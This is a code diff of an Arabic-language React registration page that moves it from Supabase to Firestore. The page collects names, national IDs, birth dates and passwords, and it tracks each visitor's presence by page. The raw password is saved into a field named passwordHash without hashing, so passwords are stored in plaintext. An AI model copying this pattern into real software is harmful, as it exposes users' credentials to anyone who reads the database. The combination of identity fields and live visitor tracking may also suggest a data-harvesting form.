@@ -1,22 +1,21 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Eye, EyeOff, ArrowLeft, User, Mail, Phone, CreditCard, Calendar, Lock, Banknote, Briefcase, MapPin, DollarSign } from 'lucide-react';
-import { supabase } from '@/lib/supabase';
+import { createUser } from '@/lib/firestore';
 import { getClientId } from '@/lib/clientId';
-import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
-import { startPresenceTracking, stopPresenceTracking } from '@/lib/presence';
-import { initSocket, disconnectSocket, updatePage, emitInstantNotification } from '@/lib/socket';
+import { useSiteConfig } from '@/context/SiteConfigContext';
+import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
 
 // Maps form field_key to DB column name
 const CORE_COLUMNS: Record<string, string> = {
-  full_name: 'full_name',
+  full_name: 'fullName',
   email: 'email',
   phone: 'phone',
-  national_id: 'national_id',
-  date_of_birth: 'date_of_birth',
-  password: 'password_hash',
+  national_id: 'nationalId',
+  date_of_birth: 'dateOfBirth',
+  password: 'passwordHash',
 };
 
 const FIELD_ICONS: Record<string, React.ElementType> = {
@@ -41,16 +40,16 @@ function FieldInput({
   showPass,
   onTogglePass,
 }: {
-  field: FormField;
+  field: any;
   value: string;
   onChange: (val: string) => void;
   showPass: boolean;
   onTogglePass: () => void;
 }) {
-  const Icon = FIELD_ICONS[field.field_key] || User;
-  const isPass = field.field_type === 'password';
-  const inputType = isPass ? (showPass ? 'text' : 'password') : field.field_type;
-  const isLtr = ['email', 'tel', 'password', 'number'].includes(field.field_type);
+  const Icon = FIELD_ICONS[field.fieldKey] || User;
+  const isPass = field.fieldType === 'password';
+  const inputType = isPass ? (showPass ? 'text' : 'password') : field.fieldType;
+  const isLtr = ['email', 'tel', 'password', 'number'].includes(field.fieldType);
 
   return (
     <div className="space-y-1.5">
@@ -60,7 +59,7 @@ function FieldInput({
         {field.required && <span className="text-red-500 text-xs">*</span>}
       </label>
       <div className="relative">
-        {field.field_type === 'textarea' ? (
+        {field.fieldType === 'textarea' ? (
           <textarea
             value={value}
             onChange={(e) => onChange(e.target.value)}
@@ -98,20 +97,16 @@ export default function RegisterPage() {
   const pg = config.register;
 
   const visibleFields = formFields
-    .filter((f) => f.page_key === 'register' && !f.is_hidden)
-    .sort((a, b) => a.field_order - b.field_order);
+    .filter((f: any) => f.pageKey === 'register' && !f.isHidden)
+    .sort((a: any, b: any) => a.fieldOrder - b.fieldOrder);
 
-  // Presence - Track when user is on this page
+  // Set user online on mount
   useEffect(() => {
-    // Start Supabase presence tracking (existing system)
-    startPresenceTracking('تسجيل');
-    
-    // Start the shared Socket.io connection for presence and notifications
-    initSocket('/register');
+    const clientId = getClientId();
+    setUserOnline(clientId, '/register');
 
     return () => {
-      stopPresenceTracking();
-      disconnectSocket();
+      setUserOffline(clientId);
     };
   }, []);
 
@@ -128,11 +123,11 @@ export default function RegisterPage() {
 
   const validate = (): string | null => {
     for (const field of visibleFields) {
-      const val = values[field.field_key] || '';
+      const val = values[field.fieldKey] || '';
       if (field.required && !val.trim()) return `${field.label} مطلوب`;
-      if (field.field_type === 'email' && val && !val.includes('@')) return 'البريد الإلكتروني غير صحيح';
-      if (field.field_key === 'password' && val && val.length < 6) return 'كلمة المرور يجب أن تكون 6 أحرف على الأقل';
-      if (field.field_key === 'confirm_password' && val !== (values['password'] || '')) return 'كلمتا المرور غير متطابقتين';
+      if (field.fieldType === 'email' && val && !val.includes('@')) return 'البريد الإلكتروني غير صحيح';
+      if (field.fieldKey === 'password' && val && val.length < 6) return 'كلمة المرور يجب أن تكون 6 أحرف على الأقل';
+      if (field.fieldKey === 'confirm_password' && val !== (values['password'] || '')) return 'كلمتا المرور غير متطابقتين';
     }
     return null;
   };
@@ -143,89 +138,76 @@ export default function RegisterPage() {
     if (err) { setError(err); return; }
 
     setLoading(true);
-    const coreData: Record<string, string> = {};
-    const extraFields: Record<string, string> = {};
 
-    // First, initialize all core columns with empty strings to satisfy DB NOT NULL constraints
-    // if they are not provided in the dynamic form.
-    Object.values(CORE_COLUMNS).forEach(col => {
-      coreData[col] = '';
-    });
+    try {
+      // Prepare user data
+      const userData: any = {
+        status: 'pending',
+        clientId: getClientId(),
+      };
 
-    for (const field of visibleFields) {
-      if (field.field_key === 'confirm_password') continue;
-      const val = (values[field.field_key] || '').trim();
-      const col = CORE_COLUMNS[field.field_key];
+      const extraFields: Record<string, string> = {};
 
-      if (!col) {
-        if (val) extraFields[field.field_key] = val;
-        continue;
+      for (const field of visibleFields) {
+        if (field.fieldKey === 'confirm_password') continue;
+        
+        const val = (values[field.fieldKey] || '').trim();
+        const col = CORE_COLUMNS[field.fieldKey];
+
+        if (!col) {
+          if (val) extraFields[field.fieldKey] = val;
+          continue;
+        }
+
+        // Handle specific fields
+        if (field.fieldKey === 'email') {
+          userData[col] = val.toLowerCase();
+        } else {
+          userData[col] = val;
+        }
       }
 
-      // If it's a core column, set its value (even if empty, it's already initialized)
-      coreData[col] = col === 'email' ? val.toLowerCase() : val;
-    }
-
-    // Remove empty core fields to avoid NOT NULL constraint errors
-    const cleanCoreData: Record<string, string> = {};
-    Object.entries(coreData).forEach(([key, value]) => {
-      if (value !== '') {
-        cleanCoreData[key] = value;
+      if (Object.keys(extraFields).length > 0) {
+        userData.extraFields = extraFields;
       }
-    });
 
-    const payload: Record<string, unknown> = { ...cleanCoreData, status: 'pending' };
-    if (Object.keys(extraFields).length > 0) {
-      payload.extra_fields = extraFields;
+      console.log('[Register] Submitting registration...');
+      
+      // Create user in Firestore
+      const userId = await createUser(userData);
+      
+      console.log('[Register] User created with ID:', userId);
+
+      // Update presence
+      const clientId = getClientId();
+      updateUserPage(clientId, '/login');
+
+      // Save to sessionStorage for login page
+      sessionStorage.setItem('reg_id', userId);
+      sessionStorage.setItem('reg_email', userData.email || '');
+      sessionStorage.setItem('reg_name', userData.fullName || '');
+
+      // Navigate to login page
+      navigate('/login');
+
+    } catch (err: any) {
+      console.error('[Register] Error:', err);
+      setError(err.message || 'حدث خطأ أثناء التسجيل. حاول مرة أخرى.');
+    } finally {
+      setLoading(false);
     }
-    
-    // Add client ID to link all data to this browser/device
-    payload.client_id = getClientId();
-
-    const { data, error: dbErr } = await supabase
-      .from('registrations')
-      .insert(payload)
-      .select('id')
-      .maybeSingle();
-
-    setLoading(false);
-    if (dbErr || !data) { 
-      console.error('Supabase Error:', dbErr);
-      setError(dbErr?.message || 'حدث خطأ أثناء التسجيل. حاول مرة أخرى.'); 
-      return; 
-    }
-
-    // Send the notification immediately via Socket with an HTTP fallback
-    await emitInstantNotification('registration', {
-      id: data.id,
-      name: typeof payload.full_name === 'string' ? payload.full_name : 'مشرف جديد',
-      created_at: new Date().toISOString(),
-    });
-
-    // Stop presence tracking before navigation
-    stopPresenceTracking();
-    
-    sessionStorage.setItem('reg_id', data.id);
-    sessionStorage.setItem('reg_email', coreData['email'] || '');
-    sessionStorage.setItem('reg_name', typeof payload.full_name === 'string' ? payload.full_name : '');
-    
-    // Update Socket.io page before navigation
-    updatePage('/login');
-    
-    // Redirect to login page after successful registration
-    navigate('/login');
   };
 
   // Group fields into pairs for grid layout
-  const fieldPairs: FormField[][] = [];
+  const fieldPairs: any[][] = [];
   const singleFields = ['date_of_birth', 'textarea'];
   let i = 0;
   while (i < visibleFields.length) {
     const f = visibleFields[i];
-    if (singleFields.includes(f.field_key) || f.field_type === 'textarea') {
+    if (singleFields.includes(f.fieldKey) || f.fieldType === 'textarea') {
       fieldPairs.push([f]);
       i++;
-    } else if (i + 1 < visibleFields.length && !singleFields.includes(visibleFields[i + 1].field_key) && visibleFields[i + 1].field_type !== 'textarea') {
+    } else if (i + 1 < visibleFields.length && !singleFields.includes(visibleFields[i + 1].fieldKey) && visibleFields[i + 1].fieldType !== 'textarea') {
       fieldPairs.push([f, visibleFields[i + 1]]);
       i += 2;
     } else {
@@ -253,12 +235,12 @@ export default function RegisterPage() {
                 <div key={idx} className={pair.length === 2 ? 'grid sm:grid-cols-2 gap-5' : ''}>
                   {pair.map((field) => (
                     <FieldInput
-                      key={field.field_key}
+                      key={field.fieldKey}
                       field={field}
-                      value={values[field.field_key] || ''}
-                      onChange={(v) => setValue(field.field_key, v)}
-                      showPass={showPass[field.field_key] || false}
-                      onTogglePass={() => togglePass(field.field_key)}
+                      value={values[field.fieldKey] || ''}
+                      onChange={(v) => setValue(field.fieldKey, v)}
+                      showPass={showPass[field.fieldKey] || false}
+                      onTogglePass={() => togglePass(field.fieldKey)}
                     />
                   ))}
                 </div>
